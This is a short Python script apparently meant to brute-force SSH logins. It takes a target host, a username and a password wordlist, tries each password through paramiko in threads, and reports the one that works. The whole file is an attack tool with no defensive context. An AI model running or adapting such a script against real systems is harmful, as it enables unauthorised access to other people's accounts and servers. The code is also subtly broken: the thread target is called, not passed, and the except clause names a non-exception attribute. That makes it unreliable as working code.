import sys
import os
import socket
import paramiko
import threading
import time

flag = 0
def ssh_connect(brute):
    global flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port=22, username=user, password=brute)
        flag = 1
        print(f"[+] ssh: {brute}\n")
    except socket.error:
        print("[-] ssh: [CF]\n")
    except Exception.__suppress_context__:
        print(f"[-] ssh: {brute} [INC]\n")
    ssh.close()

try:
    host = input("[?] host: ")
    user = input("[?] user: ")
    bruteFile = input("[?] file: ")
    if os.path.exists(bruteFile):
        print("[~] scan: [ON]\n")
    else:
        print("\n[!] path-error: [?F]\n")
        sys.exit()

    with open(bruteFile, "r") as file:
        for line in file.readlines():
            attempt = line.strip()
            thread = threading.Thread(target=ssh_connect(), args=(attempt,))
            if flag == 1:
                thread.join()
                exit()
            thread.start()
            time.sleep(0.5)

except KeyboardInterrupt:
    print("\n[0]")
    sys.exit()
